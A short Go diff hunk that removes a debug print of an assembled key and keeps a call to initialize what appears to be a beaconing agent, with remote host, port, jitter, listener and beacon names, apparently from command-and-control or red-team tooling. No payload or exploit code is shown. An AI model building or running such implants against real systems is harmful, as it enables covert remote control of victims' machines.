@@ -56,8 +56,6 @@ func main() {
 	bKey = append(bKey, bKeyc...)
 	bKey = append(bKey, bKeyd...)
 
-	fmt.Println(bKey)
-
 	// initiliaze sessions
 	err := initialization.InitAgent(RHOST, RPORT, URI, sleep, JITTER, LISTENER_NAME, AgentID, USERAGENT, bKey, BEACON_NAME)
 	if err != nil {
